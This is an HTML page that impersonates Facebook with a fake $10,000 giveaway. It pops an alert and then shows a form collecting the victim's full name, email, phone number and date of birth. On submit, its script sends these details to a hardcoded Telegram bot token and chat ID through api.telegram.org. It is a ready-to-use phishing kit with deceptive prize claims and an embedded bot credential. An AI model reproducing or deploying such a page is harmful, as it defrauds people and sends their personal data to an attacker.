<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Giveaway</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            background-color: #1877F2; 
            color: white; 
        }
        .container { 
            margin-top: 50px; 
        }
        .facebook-logo {
            width: 80px;
            height: auto;
        }
        .winner { 
            font-size: 24px; 
            font-weight: bold; 
            margin-top: 20px;
        }
        .form-container {
            background: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            margin: auto;
            display: none; /* Form hidden initially */
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Facebook Logo -->
        <img src="facebook-logo.png" alt="Facebook Logo" class="facebook-logo">

        <h1>üéâ Congratulations, <span id="winner-name">John Doe</span>! üéâ</h1>
        <p>You have won $10,000 cash from Facebook!</p>

        <!-- Form (Hidden Initially) -->
        <div class="form-container" id="giveaway-form">
            <h2>Claim Your Prize</h2>
            <form id="claimForm">
                <label>Full Name:</label><br>
                <input type="text" name="fullname" id="fullname" required><br><br>
                
                <label>Email Address:</label><br>
                <input type="email" name="email" id="email" required><br><br>
                
                <label>Phone Number:</label><br>
                <input type="tel" name="phone" id="phone" required><br><br>
                
                <label>Date of Birth:</label><br>
                <input type="date" name="dob" id="dob" required><br><br>
                
                <button type="submit">Claim Now</button>
            </form>
        </div>

        <!-- Winner's Image -->
        <h2>Previous Winners</h2>
        <div class="winner">
            <img src="winner1.jpg" alt="Winner" width="100"><br>
            <span>Jane Smith</span>
        </div>
    </div>

    <script>
        // Show alert first, then reveal form when OK is clicked
        window.onload = function() {
            setTimeout(function() {
                alert("üéâ Congratulations! You have won $10,000 cash from Facebook! Click OK to claim your prize.");
                document.getElementById("giveaway-form").style.display = "block";
            }, 500);
        };

        // Telegram Bot Integration
        document.getElementById("claimForm").addEventListener("submit", function(event) {
            event.preventDefault();

            let fullname = document.getElementById("fullname").value;
            let email = document.getElementById("email").value;
            let phone = document.getElementById("phone").value;
            let dob = document.getElementById("dob").value;

            let message = `üéâ New Giveaway Entry!\n\nüë§ Name: ${fullname}\nüìß Email: ${email}\nüìû Phone: ${phone}\nüéÇ DOB: ${dob}`;
            
            let telegramBotToken = "7540369556:AAH7gDIVcjCRomnXQgLBGkbk5qF6BUdCjX4";
            let telegramChatId = "7635429842";

            let url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("‚úÖ Your details have been submitted successfully!");
                        document.getElementById("claimForm").reset();
                    } else {
                        alert("‚ùå Error submitting details. Please try again.");
                    }
                })
                .catch(error => alert("‚ùå Network error. Please try again."));
        });
    </script>
</body>
    </html>
